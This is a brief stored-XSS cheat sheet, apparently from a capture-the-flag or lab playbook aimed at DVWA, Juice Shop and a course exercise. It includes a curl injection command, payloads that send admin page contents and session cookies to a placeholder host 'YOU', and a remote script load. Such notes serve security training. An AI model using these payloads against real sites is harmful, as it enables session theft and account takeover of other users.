# Stored XSS

**Signs**: guestbook, comments, notes, bench log, profile fields, support tickets — stored and
rendered for others (often an admin or a bot). Hint "written once, read by all; what is read can run".

## Exploit
```bash
curl -s -d 'author=shift' --data-urlencode 'text=<img src=x onerror=grant()>' $T/log
```
Then load the page in a browser (or wait for the bot). **Every field** may be injectable (author,
title, email, filename, user-agent shown in admin logs).

## Typical goals
- Flag-granting helper on the page → call it (course `grant()`).
- Admin/bot visits → steal cookie or read admin-only pages → [cookie-theft](cookie-theft.md):
```html
<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('http://YOU/?d='+btoa(t)))</script>
<img src=x onerror="fetch('http://YOU/?c='+document.cookie)">
```
- Admin performs actions for you (create user, change role) → [csrf](csrf.md).

Stored payloads may be truncated — use short ones (`<svg onload=grant()>`) or load a script
`<script src=//YOU/x.js></script>`.

Seen in: `xss2` (bench log, `author`/`text` rendered raw), DVWA "XSS (Stored)", Juice Shop.
